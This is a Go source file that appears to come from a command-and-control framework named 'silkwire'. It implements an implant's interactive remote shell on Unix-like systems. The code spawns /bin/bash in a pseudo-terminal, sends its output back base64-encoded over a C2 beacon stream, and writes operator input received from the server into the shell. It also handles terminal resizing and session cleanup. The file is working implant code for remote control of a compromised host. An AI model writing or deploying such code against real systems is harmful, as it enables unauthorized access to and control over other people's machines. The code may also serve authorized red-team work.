//go:build !windows
// +build !windows

package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"time"

	pb "silkwire/proto"

	pty "github.com/aymanbagabas/go-pty"
)

// PTY Support for Unix-like systems using go-pty library
type ptySession struct {
	id  string
	pty pty.Pty
	cmd *pty.Cmd
}

var ptySessions = make(map[string]*ptySession)

// StartPTY starts a new PTY session
func (i *Implant) StartPTY(stream pb.C2Service_BeaconStreamClient, cmd *pb.CommandMessage) error {
	shell := cmd.Command
	if shell == "" {
		shell = "/bin/bash"
	}

	// Parse size
	cols, rows := 80, 25
	if len(cmd.Args) >= 2 {
		fmt.Sscanf(cmd.Args[0], "%d", &cols)
		fmt.Sscanf(cmd.Args[1], "%d", &rows)
	}

	// Create PTY using go-pty
	p, err := pty.New()
	if err != nil {
		return fmt.Errorf("failed to create PTY: %v", err)
	}

	// Create command in the PTY
	c := p.Command(shell)

	// Start the shell process
	err = c.Start()
	if err != nil {
		p.Close()
		return fmt.Errorf("failed to start shell: %v", err)
	}

	// Set PTY size if supported
	if err := p.Resize(cols, rows); err != nil && DebugMode {
		log.Printf("Failed to set PTY size: %v", err)
	}

	// Create session
	session := &ptySession{
		id:  cmd.CommandId,
		pty: p,
		cmd: c,
	}

	ptySessions[cmd.CommandId] = session

	// Reader: stream PTY output back via Beacon as PTY_OUTPUT with base64 payload
	go func() {
		buf := make([]byte, 4096)
		for {
			n, rerr := session.pty.Read(buf)
			if n > 0 {
				b64 := base64.StdEncoding.EncodeToString(buf[:n])
				bm := &pb.BeaconMessage{
					ImplantId:    i.ID,
					SessionToken: i.SessionToken,
					Timestamp:    time.Now().Unix(),
					Type:         pb.BeaconMessage_PTY_OUTPUT,
					Payload:      []byte(fmt.Sprintf("%s|%s", cmd.CommandId, b64)),
				}
				_ = stream.Send(bm)
			}
			if rerr != nil {
				if rerr != io.EOF && DebugMode {
					log.Printf("PTY read error: %v", rerr)
				}
				break
			}
		}
	}()

	// Monitor process for exit
	go func() {
		err := session.cmd.Wait()
		exitCode := 0
		if err != nil {
			exitCode = 1
		}

		// Send exit notification
		bm := &pb.BeaconMessage{
			ImplantId:    i.ID,
			SessionToken: i.SessionToken,
			Timestamp:    time.Now().Unix(),
			Type:         pb.BeaconMessage_PTY_EXIT,
			Payload:      []byte(fmt.Sprintf("%s|%d", cmd.CommandId, exitCode)),
		}
		_ = stream.Send(bm)

		// Cleanup
		i.StopPTY(cmd.CommandId)
	}()

	return nil
}

// FeedPTYInput feeds input to a PTY session
func (i *Implant) FeedPTYInput(commandID string, data []byte) {
	if ps, ok := ptySessions[commandID]; ok && ps.pty != nil {
		// Data is base64 from server
		decoded, err := base64.StdEncoding.DecodeString(string(data))
		if err == nil {
			_, _ = ps.pty.Write(decoded)
		}
	}
}

// ResizePTY resizes a PTY session
func (i *Implant) ResizePTY(commandID string, args []string) {
	if ps, ok := ptySessions[commandID]; ok && ps.pty != nil {
		cols, rows := 80, 25
		if len(args) >= 2 {
			fmt.Sscanf(args[0], "%d", &cols)
			fmt.Sscanf(args[1], "%d", &rows)
		}
		_ = ps.pty.Resize(cols, rows)
	}
}

// StopPTY stops a PTY session
func (i *Implant) StopPTY(commandID string) {
	if ps, ok := ptySessions[commandID]; ok {
		if ps.pty != nil {
			_ = ps.pty.Close()
		}
		delete(ptySessions, commandID)
	}
}
